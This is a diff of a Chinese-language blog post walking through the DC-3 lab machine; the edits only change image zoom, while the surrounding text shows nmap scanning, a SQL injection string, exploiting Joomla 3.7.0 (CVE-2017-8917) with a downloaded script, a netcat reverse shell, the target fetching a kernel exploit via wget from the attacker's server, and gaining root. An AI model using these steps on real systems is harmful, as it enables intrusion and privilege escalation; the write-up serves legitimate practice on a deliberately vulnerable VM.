@@ -18,25 +18,25 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
 <p>获取当前机器所在的网段ip</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/ifconfig.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/ifconfig.png" style="zoom:100%;">
 
 <p>启动nmap，对本网段进行扫描：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.2.0&#x2F;24</span><br></pre></td></tr></table></figure>
 
 <p>这步也可以使用：arp-scan -l</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-sn.png" style="zoom:80%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-sn.png" style="zoom:100%;">
 
 <p>获得了靶机的ip地址：192.168.2.116</p>
 <p>对靶机192.168.2.116进行从1-65535的端口扫描port scan：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -p 1-65535 -sV 192.168.2.116</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-portscan.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-portscan.png" style="zoom:100%;">
 
 <p> 目标只开放了80端口，我们对其进行访问 </p>
 <img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/visit80.png" style="zoom:60%;">
 
 <p>进行源代码检视，没有发现特殊的提示</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/80inspector.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/80inspector.png" style="zoom:100%;">
 
 <p>尝试进行SQL注入：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
@@ -48,15 +48,15 @@
 <p>#安装方法： apt-get install joomscan </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joomscan -u http:&#x2F;&#x2F;192.168.2.116</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u1.png" style="zoom:80%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u1.png" style="zoom:100%;">
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u2.png" style="zoom:85%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u2.png" style="zoom:100%;">
 
 <p>发现了版本：Joomla 3.7.0<br>发现了管理员页面：<a href="http://192.168.2.116/administrator/" target="_blank" rel="noopener">http://192.168.2.116/administrator/</a></p>
 <p>搜索joomla3.7.0的漏洞：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit joomla |grep 3.7</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/searchsploit.png" style="zoom:85%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/searchsploit.png" style="zoom:100%;">
 
 <p>发现这个版本有SQL注入漏洞(CVE-2017-8917)<br>细节:<a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html" target="_blank" rel="noopener">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
 <p>使用joomblah脚本<br>#wget <a href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py</a></p>
@@ -81,39 +81,39 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>
 
 <p> 访问index.php，监听成功收到：</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nc-lvvp.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nc-lvvp.png" style="zoom:100%;">
 
 <p>成功！输入ls后能成功输出该靶机在该目录下的所有文件</p>
 <p>至此说明反弹shell成功，接下来开始内核提权</p>
 <p> 使用searchsploit工具查找Ubuntu 16.04的提权漏洞 </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/39772.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/39772.png" style="zoom:100%;">
 
 <p> 在kali上下载ubuntu-16-39772-exp，用python开启简单的服务器，再利用反弹shell让靶机下载kali这里下好的exp</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9000</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server.png" style="zoom:100%;">
 
 <p>利用反弹shell让靶机下载：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.2.117:9000&#x2F;exploit.tar</span><br></pre></td></tr></table></figure>
 
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/shell-download1.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/shell-download1.png" style="zoom:100%;">
 
 <p>下载成功</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server2.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server2.png" style="zoom:100%;">
 
 <p>之后利用反弹shell令靶机执行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>
 
 <p>运行成功！拿到了靶机的root权限！</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root.png" style="zoom:100%;">
 
 <p>输入id命令与whoami命令，都能确认我们已经拿到了root权限：</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root2.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root2.png" style="zoom:100%;">
 
 <p>进入root文件夹，cat 出 flag:</p>
-<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/flag.png" style="zoom:70%;">
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/flag.png" style="zoom:100%;">
 
 <p>至此，入侵靶机成功~~  花了差不多一下午的时间，还是蛮有意思的</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root</span><br><span class="line">ls</span><br><span class="line">the-flag.txt</span><br><span class="line">    </span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      &#x2F; &#x2F;__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ &#x2F;\ &#x2F; &#x2F; _ \ | | | | | |&#x2F; _ \| &#39;_ \ &#x2F; _ \ | | | |</span><br><span class="line">   \ V  V &#x2F;  __&#x2F; | | | |_| | (_) | | | |  __&#x2F;_|_|_|_|</span><br><span class="line">    \_&#x2F;\_&#x2F; \___|_|_| |____&#x2F; \___&#x2F;|_| |_|\___(_|_|_|_)</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Congratulations are in order for completing DC-3VM.  :-)</span><br><span class="line"></span><br><span class="line">I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please let me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure>
